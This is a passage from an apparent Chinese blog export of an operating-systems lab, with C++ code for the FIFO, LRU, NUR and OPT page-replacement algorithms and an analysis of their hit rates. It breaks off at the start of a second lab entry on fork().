条-第9 条指令为第0页（对应逻辑地址为[0，9]）</span></span><br><span class="line"><span class="comment">			第10条-第19条指令为第1页（对应逻辑地址为[10，19]）</span></span><br><span class="line"><span class="comment">				………………………………</span></span><br><span class="line"><span class="comment">			第310条-第319条指令为第31页（对应逻辑地址为[310，319]）</span></span><br><span class="line"><span class="comment">			按以上方式，用户指令可组成32页。</span></span><br><span class="line"><span class="comment">		*/</span> </span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			_vPage[i]=_vMain[i]/<span class="number">10</span>;</span><br><span class="line">			_vOffset[i]=_vMain[i]%<span class="number">10</span>;</span><br><span class="line">			_vPage[i]%=<span class="number">32</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类成员函数initialize-const-int-nTotal-pf"><a href="#类成员函数initialize-const-int-nTotal-pf" class="headerlink" title="类成员函数initialize(const int nTotal_pf)"></a>类成员函数initialize(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::initialize</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span></span><br><span class="line"><span class="function"></span>&#123;	<span class="comment">//初始化函数，参数表示分配的内存页面个数</span></span><br><span class="line">	<span class="type">int</span> ix;				<span class="comment">//辅助变量，用于计数</span></span><br><span class="line">	_nDiseffect=<span class="number">0</span>;		<span class="comment">//换入页面次数置零</span></span><br><span class="line">	<span class="keyword">for</span>(ix=<span class="number">0</span>;ix&lt;_vDiscPages.<span class="built_in">size</span>();ix++)		<span class="comment">//初始化进程使用的页向量</span></span><br><span class="line">	&#123;</span><br><span class="line">		_vDiscPages[ix].m_nPageNumber=ix;</span><br><span class="line">		_vDiscPages[ix].m_nPageFaceNumber=INVALID;</span><br><span class="line">		_vDiscPages[ix].m_nCounter=<span class="number">0</span>;</span><br><span class="line">		_vDiscPages[ix].m_nTime=<span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(ix=<span class="number">1</span>;ix&lt;nTotal_pf;ix++)			<span class="comment">//初始化为进程分配的物理内存页向量</span></span><br><span class="line">	&#123;</span><br><span class="line">		_vMemoryPages[ix<span class="number">-1</span>].m_pNext=&amp;_vMemoryPages[ix];</span><br><span class="line">		_vMemoryPages[ix<span class="number">-1</span>].m_nPageFaceNumber=ix<span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	_vMemoryPages[nTotal_pf<span class="number">-1</span>].m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">	_vMemoryPages[nTotal_pf<span class="number">-1</span>].m_nPageFaceNumber=nTotal_pf<span class="number">-1</span>;</span><br><span class="line">	_pFreepf_head=&amp;_vMemoryPages[<span class="number">0</span>];	<span class="comment">//初始化空闲物理页头指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类成员函数FIFO-const-int-nTotal-pf"><a href="#类成员函数FIFO-const-int-nTotal-pf" class="headerlink" title="类成员函数FIFO(const int nTotal_pf)"></a>类成员函数FIFO(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::FIFO</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i;	<span class="comment">//辅助变量，用于计数</span></span><br><span class="line">	CPageControl *p;	<span class="comment">//辅助变量，用于中间过渡</span></span><br><span class="line">	<span class="built_in">initialize</span>(nTotal_pf);	<span class="comment">//初始化</span></span><br><span class="line">	_pBusypf_head=_pBusypf_tail=<span class="literal">NULL</span>;	<span class="comment">//将已使用页面的头指针和尾指针置空</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID)</span><br><span class="line">		&#123;	<span class="comment">//如果页面页号不在物理内存中</span></span><br><span class="line">			_nDiseffect+=<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)  <span class="comment">//如果分配给进程的物理内存页面无空闲 </span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">/* 将队列中最先进入的(就是队列第一个单元)pagecontrol单元“清干净”*/</span> </span><br><span class="line">				p=_pBusypf_head-&gt;m_pNext;</span><br><span class="line">                <span class="comment">//将p指向已使用头指针指向的页面的下一个页面，即第二个已使用的页面 </span></span><br><span class="line">				_vDiscPages[_pBusypf_head-&gt;m_nPageNumber].</span><br><span class="line">                    m_nPageFaceNumber=INVALID;</span><br><span class="line">                <span class="comment">//将已使用页面头指针指向的内存单元清理干净 </span></span><br><span class="line">				_pFreepf_head=_pBusypf_head;<span class="comment">//将已使用页面头指针置为空闲页面头指针 </span></span><br><span class="line">				_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;<span class="comment">//将空闲页面头指针的下一个指针置空 </span></span><br><span class="line">				_pBusypf_head=p;<span class="comment">//将已使用页面头指针指向下一个页面 </span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/* 将待处理指令对应的页面调入内存 */</span> </span><br><span class="line">			p=_pFreepf_head-&gt;m_pNext;	<span class="comment">//将p指向空闲头指针的指向的页面的下一个页面 </span></span><br><span class="line">			_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;	<span class="comment">//将空闲头指针指向页面的下一个页面置空 </span></span><br><span class="line">			_pFreepf_head-&gt;m_nPageNumber=_vPage[i];	</span><br><span class="line">            <span class="comment">//将待处理指令对应的页号放入空闲头指针指向的页面的页号中 </span></span><br><span class="line">			_vDiscPages[_vPage[i]].m_nPageFaceNumber=_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">            <span class="comment">//将进程页向量的页号置为待处理指令对应的页号 </span></span><br><span class="line">			<span class="keyword">if</span>(_pBusypf_tail==<span class="literal">NULL</span>)	</span><br><span class="line">			&#123;	<span class="comment">//如果已使用页面尾指针为空，即在此之前内存没有被占用 </span></span><br><span class="line">				_pBusypf_head=_pBusypf_tail=_pFreepf_head; 	</span><br><span class="line">                <span class="comment">//将已使用页面的头指针、尾指针都指向的页面即待处理指令 </span></span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">else</span>&#123;		<span class="comment">//如果已使用页面尾指针不为空，即在此之前已经有页面放入内存中 </span></span><br><span class="line">				_pBusypf_tail-&gt;m_pNext=_pFreepf_head;</span><br><span class="line">                <span class="comment">//已使用页面的尾指针的下一个指针指向空闲页面头指针指向的页面 </span></span><br><span class="line">				_pBusypf_tail=_pFreepf_head;</span><br><span class="line">                <span class="comment">//已使用页面的尾指针指向空闲页面头指针指向的页面 </span></span><br><span class="line">			&#125;</span><br><span class="line">			_pFreepf_head=p;<span class="comment">//将空闲页面的头指针指向下一个页面 </span></span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"> 	cout&lt;&lt;<span class="string">&quot;FIFO: &quot;</span>&lt;&lt;fixed&lt;&lt;<span class="built_in">setprecision</span>(<span class="number">6</span>)&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">&quot;\t&quot;</span>;	</span><br><span class="line">    <span class="comment">//打印出命中率 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类成员函数LRU-const-int-nTotal-pf"><a href="#类成员函数LRU-const-int-nTotal-pf" class="headerlink" title="类成员函数LRU(const int nTotal_pf)"></a>类成员函数LRU(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::LRU</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i,j,nMin,minj,<span class="built_in">nPresentTime</span>(<span class="number">0</span>);	<span class="comment">//辅助变量，用于计数和作为中间变量过渡 </span></span><br><span class="line">	<span class="built_in">initialize</span>(nTotal_pf);	<span class="comment">//初始化 </span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID)</span><br><span class="line">		&#123;	<span class="comment">//如果页面页号不在物理内存中</span></span><br><span class="line">			_nDiseffect++;</span><br><span class="line">			<span class="comment">/* 寻找最近最少使用的页面并将其调出内存 */</span> </span><br><span class="line">			<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)	<span class="comment">//如果分配给进程的物理内存页面无空闲</span></span><br><span class="line">			&#123;</span><br><span class="line">    			nMin=<span class="number">32767</span>;</span><br><span class="line">    			<span class="comment">/*</span></span><br><span class="line"><span class="comment">					循环结束后，得到最近最少使用的页面的页号,</span></span><br><span class="line"><span class="comment">					nMin表示最近最少使用页面的访问次数;</span></span><br><span class="line"><span class="comment">					minj表示需要换出的页号</span></span><br><span class="line"><span class="comment">				*/</span> </span><br><span class="line">				<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>((nMin&gt;_vDiscPages[j].m_nTime)&amp;&amp;</span><br><span class="line">                       (_vDiscPages[j].m_nPageFaceNumber!=INVALID))	 </span><br><span class="line">					&#123;	<span class="comment">//进程页面访问次数小于nMin且页面页号在物理内存中 </span></span><br><span class="line">						nMin=_vDiscPages[j].m_nTime;</span><br><span class="line">		    			minj=j;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[minj].</span><br><span class="line">                                             m_nPageFaceNumber];</span><br><span class="line">                <span class="comment">//将空闲页面的头指针指向需要换出的页号</span></span><br><span class="line">				_vDiscPages[minj].m_nPageFaceNumber=INVALID;</span><br><span class="line">                <span class="comment">//将需要换出的页面移出物理内存 </span></span><br><span class="line">				_vDiscPages[minj].m_nTime=<span class="number">-1</span>;<span class="comment">//将需要换出的页面的访问次数设置为-1 </span></span><br><span class="line">				_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;<span class="comment">//将空闲头指针的下一个指针置空 </span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/* 将待执行指令的页面调入内存 */</span> </span><br><span class="line">			_vDiscPages[_vPage[i]].m_nPageFaceNumber=</span><br><span class="line">                _pFreepf_head-&gt;m_nPageFaceNumber;	</span><br><span class="line">            <span class="comment">//将需要换入的页面的页号置为之前空闲头指针指向的页面的页号，</span></span><br><span class="line">            <span class="comment">//即将要换入的页面放入内存中 </span></span><br><span class="line">			_vDiscPages[_vPage[i]].m_nTime=nPresentTime;	</span><br><span class="line">            <span class="comment">//将要放入的页面的访问次数设置为nPresentTime </span></span><br><span class="line">			_pFreepf_head=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">            <span class="comment">//将空闲头指针指向下一个指针指向的页面 </span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;	<span class="comment">//如果页面页号已经在物理内存中 </span></span><br><span class="line">			_vDiscPages[_vPage[i]].m_nTime=nPresentTime;</span><br><span class="line">            <span class="comment">//将页面的访问次数设置为nPresentTime</span></span><br><span class="line">		&#125;</span><br><span class="line">		nPresentTime++;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;LRU: &quot;</span>&lt;&lt;fixed&lt;&lt;<span class="built_in">setprecision</span>(<span class="number">6</span>)&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">&quot;\t&quot;</span>;	</span><br><span class="line">    <span class="comment">//打印出命中率 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类成员函数NUR-const-int-nTotal-pf"><a href="#类成员函数NUR-const-int-nTotal-pf" class="headerlink" title="类成员函数NUR(const int nTotal_pf)"></a>类成员函数NUR(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::NUR</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> i,j,nDiscPage,nOld_DiscPage;</span><br><span class="line">	<span class="type">bool</span> bCont_flag;<span class="comment">//设置循环条件 </span></span><br><span class="line">	<span class="built_in">initialize</span>(nTotal_pf);<span class="comment">//初始化 </span></span><br><span class="line">	nDiscPage=<span class="number">0</span>;<span class="comment">//将nDiscPage置为0 </span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID)</span><br><span class="line">		&#123;	<span class="comment">//如果页面页号不在物理内存中</span></span><br><span class="line">			_nDiseffect++;</span><br><span class="line">			<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)	 </span><br><span class="line">			&#123;	<span class="comment">//如果分配给进程的物理内存页面无空闲，则将最近未使用的页面调出内存 </span></span><br><span class="line">    			bCont_flag=<span class="literal">true</span>;	</span><br><span class="line">    			nOld_DiscPage=nDiscPage;</span><br><span class="line">				<span class="keyword">while</span>(bCont_flag)</span><br><span class="line">				&#123;</span><br><span class="line">                    <span class="keyword">if</span>(_vDiscPages[nDiscPage].m_nCounter==<span class="number">0</span>&amp;&amp;</span><br><span class="line">                       _vDiscPages[nDiscPage].m_nPageFaceNumber!=INVALID) </span><br><span class="line">					&#123;	<span class="comment">//如果页面计数为零并且该页面的页号不在物理内存中 </span></span><br><span class="line">						bCont_flag=<span class="literal">false</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;	<span class="comment">//如果页面计数不为零并且该页面的页号在物理内存中  </span></span><br><span class="line">						nDiscPage++;</span><br><span class="line">						<span class="keyword">if</span>(nDiscPage==TOTAL_VP) </span><br><span class="line">						&#123;	<span class="comment">//一个循环后，重新置零 </span></span><br><span class="line">							nDiscPage=<span class="number">0</span>;</span><br><span class="line">						&#125; </span><br><span class="line">						<span class="keyword">if</span>(nDiscPage==nOld_DiscPage)</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++) </span><br><span class="line">							&#123;	<span class="comment">//将所有页面的计数清零</span></span><br><span class="line">								_vDiscPages[j].m_nCounter=<span class="number">0</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">	   				&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[nDiscPage].</span><br><span class="line">                                             m_nPageFaceNumber];	</span><br><span class="line">                <span class="comment">//将空闲页面的头指针指向该物理页面的页号 </span></span><br><span class="line">				_vDiscPages[nDiscPage].m_nPageFaceNumber=INVALID;	</span><br><span class="line">                <span class="comment">//将该物理页面的页号置为不在内存中 </span></span><br><span class="line">    			_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;	</span><br><span class="line">                <span class="comment">//将空闲头指针的下一个地址设置为空 </span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/* 将待执行的指令的页面调入内存中 */</span> </span><br><span class="line">			_vDiscPages[_vPage[i]].m_nPageFaceNumber=</span><br><span class="line">                _pFreepf_head-&gt;m_nPageFaceNumber;	</span><br><span class="line">            <span class="comment">//将待执行页面的页号设置为空闲头指针指向的页号 </span></span><br><span class="line">			_pFreepf_head=_pFreepf_head-&gt;m_pNext;	</span><br><span class="line">            <span class="comment">//将空闲头指针指向下一个页面 </span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;	<span class="comment">//如果页面页号已经在物理内存中 </span></span><br><span class="line">			_vDiscPages[_vPage[i]].m_nCounter=<span class="number">1</span>;<span class="comment">//将该页面的计数＋1 </span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* 定期将所有页面存放是否被CPU处理信息的属性均置于初始态 */</span> </span><br><span class="line">		<span class="keyword">if</span>(i%CLEAR_PERIOD==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)	 </span><br><span class="line">			&#123;	<span class="comment">//将所有页面的计数清零</span></span><br><span class="line">				_vDiscPages[j].m_nCounter=<span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	cout.<span class="built_in">setf</span>(ios::fixed);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;NUR:&quot;</span>&lt;&lt;fixed&lt;&lt;<span class="built_in">setprecision</span>(<span class="number">6</span>)&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">&quot;\t&quot;</span>;	</span><br><span class="line">    <span class="comment">//打印命中率 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类成员函数OPT-const-int-nTotal-pf"><a href="#类成员函数OPT-const-int-nTotal-pf" class="headerlink" title="类成员函数OPT(const int nTotal_pf)"></a>类成员函数OPT(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::OPT</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> i,j,max,maxpage,nDistance,vDistance[TOTAL_VP];</span><br><span class="line">    <span class="comment">//vDistance[TOTAL_VP]表示页面在第几步被处理,其它的是辅助变量，用于计数和中间过渡 </span></span><br><span class="line">	<span class="built_in">initialize</span>(nTotal_pf);	<span class="comment">//初始化 </span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID) </span><br><span class="line">		&#123;	<span class="comment">//如果页面页号不在物理内存中 </span></span><br><span class="line">			_nDiseffect++;</span><br><span class="line">			<span class="comment">/* 将不在处理的页面或者最后待处理的页面调出内存 */</span> </span><br><span class="line">			<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)</span><br><span class="line">			&#123;	<span class="comment">//如果分配给进程的物理内存页面无空闲 </span></span><br><span class="line">				<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(_vDiscPages[j].m_nPageFaceNumber!=INVALID)</span><br><span class="line">					&#123;	<span class="comment">//如果虚页j已经在物理内存中，将其设置为最后处理 </span></span><br><span class="line">						vDistance[j]=<span class="number">32767</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;	<span class="comment">//如果虚页j不在物理内存中，将vDistance[j]置为0</span></span><br><span class="line">						vDistance[j]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; </span><br><span class="line">				nDistance=<span class="number">1</span>; </span><br><span class="line">				<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;TOTAL_INSTRUCTION;j++)</span><br><span class="line">				&#123;	<span class="comment">//遍历所有页面，得到所有页面在第几步被处理 </span></span><br><span class="line">					<span class="keyword">if</span>((_vDiscPages[_vPage[j]].m_nPageFaceNumber!=INVALID)&amp;&amp;</span><br><span class="line">                       (vDistance[_vPage[j]]==<span class="number">32767</span>))</span><br><span class="line">					&#123;	<span class="comment">//如果虚页j在物理内存中并且在第32767步被处理，</span></span><br><span class="line">                        <span class="comment">//则将处理步数重置为nDistance </span></span><br><span class="line">						vDistance[_vPage[j]]=nDistance;</span><br><span class="line">					&#125;</span><br><span class="line">					nDistance++;</span><br><span class="line">				&#125;</span><br><span class="line">    			max	=<span class="number">-1</span>;</span><br><span class="line">    			<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">				&#123;	<span class="comment">//遍历所有页面找出找出最后处理的页面 </span></span><br><span class="line">					<span class="keyword">if</span>(max&lt;vDistance[j])</span><br><span class="line">	  				&#123;</span><br><span class="line">					    max=vDistance[j];</span><br><span class="line">					    maxpage=j;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">/* 将最后处理的页面调出 */</span> </span><br><span class="line">				_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[maxpage].</span><br><span class="line">                                             m_nPageFaceNumber];	</span><br><span class="line">                <span class="comment">//将空闲头指针指向最后处理的页面 </span></span><br><span class="line">				_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;<span class="comment">//将空闲头指针指向的下一个位置置空 </span></span><br><span class="line">				_vDiscPages[maxpage].m_nPageFaceNumber=INVALID;	</span><br><span class="line">                <span class="comment">//将最后处理的页面调出内存 </span></span><br><span class="line">			&#125;</span><br><span class="line">			_vDiscPages[_vPage[i]].m_nPageFaceNumber=</span><br><span class="line">                _pFreepf_head-&gt;m_nPageFaceNumber;	</span><br><span class="line">            <span class="comment">//将待执行指令的页号置为空闲头指针指向的页号 </span></span><br><span class="line">			_pFreepf_head=_pFreepf_head-&gt;m_pNext;<span class="comment">//将空闲头指针指向下一个页面 </span></span><br><span class="line">		&#125;</span><br><span class="line">   &#125;</span><br><span class="line">	cout.<span class="built_in">setf</span>(ios::fixed);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;OPT:&quot;</span>&lt;&lt;fixed&lt;&lt;<span class="built_in">setprecision</span>(<span class="number">6</span>)&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">&quot;\t&quot;</span>;</span><br><span class="line">    <span class="comment">//打印命中率 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main()函数"></a>main()函数</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span>	<span class="comment">//vector是一种顺序容器，事实上和数组差不多，但它比数组更优越。一般来说数组不能动态拓展，因此在程序运行的时候不是浪费内存，就是造成越界。而vector正好弥补了这个缺陷，它的特征是相当于可分配拓展的数组，它的随机访问快，在中间插入和删除慢，但在末端插入和删除快，而且如果用.at()访问的话，也可以做越界检查。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span>	<span class="comment">//同&lt;stdlib.h&gt;，c开头是C++的习惯，.h结尾是C的习惯 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span>	<span class="comment">//同&lt;stdio.h&gt;，c开头是C++的习惯，.h结尾是C的习惯  </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>	<span class="comment">//封装了类UNIX系统下的很多固定名称的system_call系统调用，提供对POSIX操作系统API的访问功能。所以，这个函数是依赖于编译器，依赖于操作系统的。 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span>	<span class="comment">//声明流操作符，规范输出格式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID -1</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">int</span> <span class="title">TOTAL_INSTRUCTION</span><span class="params">(<span class="number">320</span>)</span></span>;	<span class="comment">//声明全局静态变量指令总数(TOTAL_INSTRUCTION)为320 </span></span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">int</span> <span class="title">TOTAL_VP</span><span class="params">(<span class="number">32</span>)</span></span>;				<span class="comment">//声明虚页长度(TOTAL_VP)为32 </span></span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">int</span> <span class="title">CLEAR_PERIOD</span><span class="params">(<span class="number">50</span>)</span></span>;			<span class="comment">//声明进程清零周期(CLEAR_PERIOD)为50</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Page.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PageControl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Memory.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	CMemory a;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">4</span>;i&lt;=<span class="number">32</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a.<span class="built_in">FIFO</span>(i);	<span class="comment">//FIFO算法命中率 </span></span><br><span class="line"> 	    a.<span class="built_in">LRU</span>(i);	<span class="comment">//LRU算法命中率 </span></span><br><span class="line">		a.<span class="built_in">NUR</span>(i);	<span class="comment">//NUR算法命中率</span></span><br><span class="line">		a.<span class="built_in">OPT</span>(i);	<span class="comment">//OPT算法命中率 </span></span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	<span class="comment">//5p2O5rK76ZyW== </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="实验结果及分析"><a href="#实验结果及分析" class="headerlink" title="实验结果及分析"></a>实验结果及分析</h1><ol>
<li><p>在RED Hat Linux中通过输入以下命令执行程序；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">g++ -o main mian.cpp</span><br><span class="line">./main</span><br></pre></td></tr></table></figure></li>
<li><p>得到程序结果如下；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571280409171.png" alt="1571280409171"></p>
</li>
<li><p>结果分析；</p>
<ol>
<li>四种页面置换算法OPT算法的命中率最高，其它三种基本相同；</li>
<li>随着分配内存页面逐渐增加，每种页面置换算法的命中率也会相应增加，并且趋于一个稳定值90%；</li>
<li>如果次数非常大，这四种置换算法的命中率基本一致；</li>
</ol>
</li>
</ol>
<h1 id="实验难点与收获"><a href="#实验难点与收获" class="headerlink" title="实验难点与收获"></a>实验难点与收获</h1><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ol>
<li>对OPT置换算法和对NUR置换算法的理解；</li>
<li>C++编程中类的使用规范等；</li>
</ol>
<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol>
<li>学习了四种置换算法的基本原理和C++语言实现；</li>
<li>通过实验结果，对比得到了四种算法的优劣；</li>
<li>了解了内存页面调度的机理；</li>
<li>进一步熟悉了C++中类的调用规范；</li>
</ol>
<h1 id="实验思考"><a href="#实验思考" class="headerlink" title="实验思考"></a>实验思考</h1><p>实验通过对四种页面置换算法进行横向对比和纵向对比，展示了四种算法的优缺点；但是实验结果对实验的原理体现的不太明显，可以在实验结果中增加每种算法的执行过程，让算法原理理解。</p>
]]></content>
      <categories>
        <category>操作系统内核实验</category>
      </categories>
      <tags>
        <tag>存储器管理</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统内核-实验二</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%BA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>加深对进程概念的理解，明确进程和程序的区别；                                                                     </li>
<li>进一步认识并发执行的实质；                                                                                       </li>
<li>分析进程争用资源的现象，学习解决进程互斥的方法； </li>
<li>了解Linux系统中进程通信的基本原理；<span id="more"></span></li>
</ol>
<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h3><ul>
<li><p>在Linux中，fork函数是非常重要的函数，它的作用是从已经存在的父进程中创建一个子进程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>		<span class="comment">//引用fork时的头文件</span></span></span><br><span class="line"><span class="type">pid_t</span>   <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;		<span class="comment">//fork的返回类型为空1</span></span><br></pre></td></tr></table></figure></li>
<li><p>当一个进程调用fork函数之后，就有两个二进制代码相同的进程，运行在相同的位置，但是每个进程都开始自己的活动。</p>
